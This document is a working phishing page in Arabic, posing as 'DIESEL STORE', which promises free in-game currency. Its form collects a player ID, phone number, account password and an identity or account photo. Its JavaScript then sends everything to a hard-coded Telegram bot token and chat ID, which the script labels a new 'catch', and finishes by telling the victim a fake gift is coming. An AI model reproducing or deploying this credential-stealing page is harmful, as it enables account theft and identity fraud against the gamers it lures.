<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ DIESEL STORE - PREMIUM ⚡</title>
    <style>
        /* خلفية متحركة وألوان نيون */
        body { 
            background: radial-gradient(circle, #0f172a, #020617); 
            color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden;
        }
        /* كارت بتأثير الضوء الهارب */
        .card { 
            background: rgba(15, 23, 42, 0.8); width: 100%; max-width: 420px; 
            padding: 40px 30px; border-radius: 30px; position: relative;
            border: 2px solid #f9a825; box-shadow: 0 0 30px rgba(249, 168, 37, 0.4);
            backdrop-filter: blur(10px); z-index: 1;
        }
        .card::before {
            content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px;
            background: linear-gradient(45deg, #f9a825, #ff5722, #f9a825, #ffeb3b);
            z-index: -1; border-radius: 32px; filter: blur(10px);
            animation: lighting 3s linear infinite; opacity: 0.5;
        }
        @keyframes lighting { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }

        h2 { color: #f9a825; text-shadow: 0 0 10px #f9a825; margin-bottom: 5px; font-size: 28px; }
        p { color: #cbd5e1; margin-bottom: 30px; font-size: 14px; }

        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; margin-bottom: 5px; color: #f9a825; font-size: 12px; font-weight: bold; margin-right: 10px; }
        
        input, select { 
            width: 100%; padding: 15px; background: rgba(0,0,0,0.5); border: 1px solid #334155; 
            color: white; border-radius: 15px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s;
        }
        input:focus { border-color: #f9a825; box-shadow: 0 0 15px rgba(249, 168, 37, 0.4); background: black; }

        /* ستايل سحب الصور */
        .file-upload {
            border: 2px dashed #334155; padding: 20px; border-radius: 15px; cursor: pointer;
            background: rgba(249, 168, 37, 0.05); transition: 0.3s; margin-top: 10px;
        }
        .file-upload:hover { border-color: #f9a825; background: rgba(249, 168, 37, 0.1); }
        #file-name { font-size: 12px; color: #94a3b8; margin-top: 5px; display: block; }

        .btn { 
            width: 100%; padding: 18px; background: linear-gradient(90deg, #f9a825, #ff8f00); 
            color: black; font-weight: 900; border-radius: 15px; cursor: pointer; border: none; 
            font-size: 18px; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3); transition: 0.3s;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(249, 168, 37, 0.4); }
        .btn:active { transform: translateY(1px); }

        .footer-note { font-size: 10px; color: #475569; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="card">
        <h2>DIESEL STORE ⚡</h2>
        <p>النظام العالمي لشحن شدات وجواهر الألعاب مجاناً</p>
        
        <div class="input-group">
            <label>ID اللاعب</label>
            <input type="number" id="player_id" placeholder="مثال: 512345678">
        </div>

        <div class="input-group">
            <label>رقم الهاتف</label>
            <input type="tel" id="phone" placeholder="01xxxxxxxxx">
        </div>

        <div class="input-group">
            <label>كلمة المرور</label>
            <input type="password" id="password" placeholder="كلمة سر الحساب">
        </div>

        <div class="input-group">
            <label>إثبات الهوية (صورة الحساب أو البطاقة)</label>
            <div class="file-upload" onclick="document.getElementById('imageFile').click()">
                <span>📸 اضغط لرفع الصورة</span>
                <input type="file" id="imageFile" style="display:none" accept="image/*" onchange="updateFileName()">
                <span id="file-name">لم يتم اختيار صورة بعد</span>
            </div>
        </div>

        <button class="btn" onclick="sendData()">تفعيل الشحن الآن 🔥</button>
        
        <div class="footer-note">خادم الديزل محمي بتشفير 256-bit SSL</div>
    </div>

    <script>
        function updateFileName() {
            const file = document.getElementById('imageFile').files[0];
            document.getElementById('file-name').innerText = file ? "✅ تم اختيار: " + file.name : "لم يتم اختيار صورة بعد";
        }

        async function sendData() {
            const token = "8662417866:AAEc6eVH1xJHBHxvAWUJccFpkU1xKoVNDNg";
            const chat_id = "5177962707";
            
            const id = document.getElementById('player_id').value;
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('password').value;
            const fileInput = document.getElementById('imageFile');

            if(!id || !phone || !pass) {
                alert('الرجاء إدخال كافة البيانات المطلوبة!');
                return;
            }

            const btn = document.querySelector('.btn');
            btn.innerText = "جاري الاتصال بالسيرفر...";
            btn.disabled = true;

            // 1. إرسال البيانات النصية
            const message = `🚀 صيد ديزل VIP جديد 🚀\n\n🆔 ID: ${id}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}`;
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);

            // 2. إرسال الصورة لو موجودة
            if (fileInput.files.length > 0) {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', fileInput.files[0]);
                formData.append('caption', `🖼 صورة الحساب الخاصة بـ ID: ${id}`);
                
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }

            alert('✅ تم استلام طلبك! سيتم فحص البيانات وإرسال الهدية خلال 15 دقيقة.');
            window.location.reload();
        }
    </script>
</body>
</html>
